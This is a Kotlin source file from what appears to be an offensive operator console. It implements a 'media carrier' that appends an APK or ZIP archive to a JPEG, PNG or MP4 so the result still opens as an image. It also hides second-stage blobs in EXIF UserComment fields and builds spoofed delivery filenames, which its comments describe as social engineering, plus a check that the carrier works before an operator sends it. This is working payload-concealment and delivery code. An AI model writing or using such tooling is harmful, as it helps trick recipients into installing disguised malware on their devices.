package com.vector.console.data.payload

import java.io.ByteArrayOutputStream

/**
 * Media carriers.
 *
 * The premise people get wrong: opening a photo does not execute anything. A JPEG is decoded,
 * not run. What *is* achievable is making one file be two things at once, so the same bytes are
 * a valid photo and a valid archive.
 *
 * Three mechanisms, in descending order of reliability:
 *
 *  1. **Appended archive** ([appendArchive]). A ZIP reader locates the central directory from
 *     the end-of-central-directory record and computes an offset delta when the recorded
 *     offsets do not match the file. That tolerance is exactly how self-extracting archives
 *     work, and it is why `photo.jpg` can also be a complete APK. The image opens normally
 *     because its decoder stops at the end-of-image marker long before the archive begins.
 *
 *  2. **EXIF UserComment** ([injectUserComment]). Metadata is not executed either, but a blob
 *     carried here survives naive re-encoding and is trivially retrievable. Use it for a
 *     config, a key, or a small second stage — not for an APK.
 *
 *  3. **Extension spoofing** ([spoofedName]). Pure social engineering. The bytes are whatever
 *     they are; the filename and icon do the work.
 *
 * What none of this does: exploit a decoder. That requires a memory-corruption bug, which is a
 * different discipline entirely.
 */
object MediaCarrier {

    enum class Kind { JPEG, PNG, MP4, UNKNOWN }

    data class Report(
        val kind: Kind,
        val coverBytes: Int,
        val blobBytes: Int,
        val totalBytes: Int,
        /** True when the result still parses as [kind] from its first bytes. */
        val stillValidMedia: Boolean,
        /** True when the appended region round-trips back out byte for byte. */
        val blobRecoverable: Boolean,
        val note: String
    )

    fun sniff(bytes: ByteArray): Kind = when {
        bytes.size >= 3 &&
            bytes[0] == 0xFF.toByte() && bytes[1] == 0xD8.toByte() -> Kind.JPEG
        bytes.size >= 8 &&
            bytes[0] == 0x89.toByte() && bytes[1] == 0x50.toByte() &&
            bytes[2] == 0x4E.toByte() && bytes[3] == 0x47.toByte() -> Kind.PNG
        bytes.size >= 12 &&
            String(bytes, 4, 4, Charsets.ISO_8859_1) == "ftyp" -> Kind.MP4
        else -> Kind.UNKNOWN
    }

    /**
     * Concatenates cover + archive.
     *
     * No separator and no length header: the archive's own EOCD is the index, and the JPEG/MP4
     * decoder never looks past its own terminator. Adding a delimiter would break the ZIP
     * reader's offset arithmetic, which is the one thing that must stay intact.
     */
    fun appendArchive(cover: ByteArray, archive: ByteArray): ByteArray {
        require(cover.isNotEmpty()) { "Cover file is empty." }
        require(archive.isNotEmpty()) { "Archive is empty." }
        val kind = sniff(cover)
        require(kind != Kind.UNKNOWN) { "Cover is not a recognised JPEG, PNG, or MP4." }
        return cover + archive
    }

    /** Verifies a carrier actually works before the operator sends it anywhere. */
    fun verify(carrier: ByteArray, coverSize: Int): Report {
        val kind = sniff(carrier)
        val blob = if (carrier.size > coverSize) carrier.copyOfRange(coverSize, carrier.size)
        else ByteArray(0)

        val recoverable = runCatching {
            if (blob.isEmpty()) false
            else ZipArchive.read(blob).entries.isNotEmpty()
        }.getOrDefault(false)

        val mediaValid = when (kind) {
            Kind.JPEG -> carrier.size >= 2 &&
                carrier[0] == 0xFF.toByte() && carrier[1] == 0xD8.toByte()
            Kind.PNG -> carrier.size >= 8 && carrier[0] == 0x89.toByte()
            Kind.MP4 -> carrier.size >= 12 &&
                String(carrier, 4, 4, Charsets.ISO_8859_1) == "ftyp"
            Kind.UNKNOWN -> false
        }

        val note = when {
            !mediaValid -> "Cover does not open — the header was damaged."
            !recoverable -> "Archive region is not a readable ZIP."
            else -> "Reads as ${kind.name} and carries a ${blob.size}-byte archive."
        }

        return Report(
            kind = kind,
            coverBytes = coverSize,
            blobBytes = blob.size,
            totalBytes = carrier.size,
            stillValidMedia = mediaValid,
            blobRecoverable = recoverable,
            note = note
        )
    }

    // ------------------------------------------------------------------ EXIF

    /**
     * Replaces the JPEG's Exif APP1 segment with a minimal one carrying [blob] as UserComment.
     *
     * The whole segment is rebuilt rather than edited: adding a tag to an existing IFD means
     * shifting every subsequent offset, and getting that wrong silently corrupts the file.
     * Dropping the original metadata is the honest trade — the image still renders, and the
     * result is deterministic.
     */
    fun injectUserComment(jpeg: ByteArray, blob: ByteArray): ByteArray {
        require(sniff(jpeg) == Kind.JPEG) { "Not a JPEG." }
        val stripped = stripApp1(jpeg)
        val app1 = buildExifSegment(blob)
        val out = ByteArrayOutputStream(stripped.size + app1.size)
        out.write(stripped, 0, 2) // SOI
        out.write(app1)
        out.write(stripped, 2, stripped.size - 2)
        return out.toByteArray()
    }

    /** Pulls the blob back out of a carrier built by [injectUserComment]. */
    fun readUserComment(jpeg: ByteArray): ByteArray? {
        if (sniff(jpeg) != Kind.JPEG) return null
        var p = 2
        while (p + 4 <= jpeg.size) {
            if (jpeg[p] != 0xFF.toByte()) return null
            val marker = jpeg[p + 1].toInt() and 0xFF
            if (marker == 0xDA || marker == 0xD9) return null // start of scan / end of image
            val length = ((jpeg[p + 2].toInt() and 0xFF) shl 8) or (jpeg[p + 3].toInt() and 0xFF)
            if (marker == 0xE1 && p + 4 + 6 <= jpeg.size) {
                val payload = p + 4
                if (String(jpeg, payload, 4, Charsets.ISO_8859_1) == "Exif") {
                    return extractUserComment(jpeg, payload + 6, length - 8)
                }
            }
            p += 2 + length
        }
        return null
    }

    private fun extractUserComment(buf: ByteArray, tiffStart: Int, tiffLength: Int): ByteArray? {
        if (tiffStart + 8 > buf.size) return null
        val little = buf[tiffStart] == 'I'.code.toByte()
        if (readU16(buf, tiffStart + 2, little) != 0x2A) return null
        val ifd0 = tiffStart + readU32(buf, tiffStart + 4, little)
        if (ifd0 + 2 > buf.size) return null
        val count = readU16(buf, ifd0, little)

        for (i in 0 until count) {
            val entry = ifd0 + 2 + i * 12
            if (entry + 12 > buf.size) return null
            if (readU16(buf, entry, little) != 0x9286) continue // UserComment
            val length = readU32(buf, entry + 4, little)
            if (length < 8) return null
            // Values of 4 bytes or fewer sit inline at entry+8; anything larger is an offset
            // relative to the TIFF header. The 8-byte charset designator is never content.
            val field = readU32(buf, entry + 8, little)
            val valueStart = if (length <= 4) entry + 8 else tiffStart + field
            val from = valueStart + 8
            val to = (valueStart + length).coerceAtMost(buf.size)
            if (from >= to) return null
            return buf.copyOfRange(from, to)
        }
        return null
    }

    private fun stripApp1(jpeg: ByteArray): ByteArray {
        val out = ByteArrayOutputStream(jpeg.size)
        out.write(jpeg, 0, 2)
        var p = 2
        while (p + 4 <= jpeg.size) {
            val marker = jpeg[p + 1].toInt() and 0xFF
            if (marker == 0xDA || marker == 0xD9) { // start of scan: copy the rest verbatim
                out.write(jpeg, p, jpeg.size - p)
                return out.toByteArray()
            }
            val length = ((jpeg[p + 2].toInt() and 0xFF) shl 8) or (jpeg[p + 3].toInt() and 0xFF)
            val isExif = marker == 0xE1 && p + 4 + 4 <= jpeg.size &&
                String(jpeg, p + 4, 4, Charsets.ISO_8859_1) == "Exif"
            if (!isExif) out.write(jpeg, p, 2 + length)
            p += 2 + length
        }
        return out.toByteArray()
    }

    /**
     * TIFF header, one IFD, one entry: UserComment as UNDEFINED.
     *
     * Little-endian (`II`) so the offset arithmetic is trivial; every consumer accepts it.
     */
    private fun buildExifSegment(blob: ByteArray): ByteArray {
        val charset = "ASCII\u0000\u0000\u0000".toByteArray(Charsets.ISO_8859_1)
        val value = charset + blob
        val count = value.size

        val tiff = ByteArrayOutputStream()
        tiff.write("II".toByteArray(Charsets.ISO_8859_1))
        tiff.write(u16(0x2A))
        tiff.write(u32(8)) // IFD0 immediately after the header

        tiff.write(u16(1)) // one entry
        tiff.write(u16(0x9286)) // UserComment
        tiff.write(u16(7)) // type UNDEFINED
        tiff.write(u32(count.toLong()))

        // Values of 4 bytes or fewer live inline in the entry; anything larger is an offset.
        val ifdEnd = 8 + 2 + 12 + 4
        if (count <= 4) {
            tiff.write(value.copyOf(4))
        } else {
            tiff.write(u32(ifdEnd.toLong()))
        }
        tiff.write(u32(0)) // no next IFD
        if (count > 4) tiff.write(value)

        val payload = "Exif\u0000\u0000".toByteArray(Charsets.ISO_8859_1) + tiff.toByteArray()
        val out = ByteArrayOutputStream(payload.size + 4)
        out.write(0xFF)
        out.write(0xE1)
        out.write(u16(payload.size + 2))
        out.write(payload)
        return out.toByteArray()
    }

    // ------------------------------------------------------------- filenames

    /**
     * Filename for delivery. [extension] is what the recipient sees; [realExtension] is what
     * the file actually is. On Windows, hidden extensions make this the whole attack; on
     * Android the share sheet shows the name and the installer validates the bytes.
     */
    fun spoofedName(base: String, extension: String): String {
        val clean = base.trim().replace(Regex("[\\\\/:*?\"<>|]"), "_").ifBlank { "IMG_2026" }
        val ext = extension.trim().trimStart('.').ifBlank { "jpg" }
        return "$clean.$ext"
    }

    private fun u16(value: Int): ByteArray =
        byteArrayOf((value and 0xFF).toByte(), ((value shr 8) and 0xFF).toByte())

    private fun u32(value: Long): ByteArray = byteArrayOf(
        (value and 0xFF).toByte(),
        ((value shr 8) and 0xFF).toByte(),
        ((value shr 16) and 0xFF).toByte(),
        ((value shr 24) and 0xFF).toByte()
    )

    private fun readU16(b: ByteArray, at: Int, little: Boolean): Int {
        val a = b[at].toInt() and 0xFF
        val c = b[at + 1].toInt() and 0xFF
        return if (little) (c shl 8) or a else (a shl 8) or c
    }

    private fun readU32(b: ByteArray, at: Int, little: Boolean): Int {
        val v = longArrayOf(
            (b[at].toInt() and 0xFF).toLong(),
            (b[at + 1].toInt() and 0xFF).toLong(),
            (b[at + 2].toInt() and 0xFF).toLong(),
            (b[at + 3].toInt() and 0xFF).toLong()
        )
        return (if (little) {
            v[0] or (v[1] shl 8) or (v[2] shl 16) or (v[3] shl 24)
        } else {
            v[3] or (v[2] shl 8) or (v[1] shl 16) or (v[0] shl 24)
        }).toInt()
    }
}
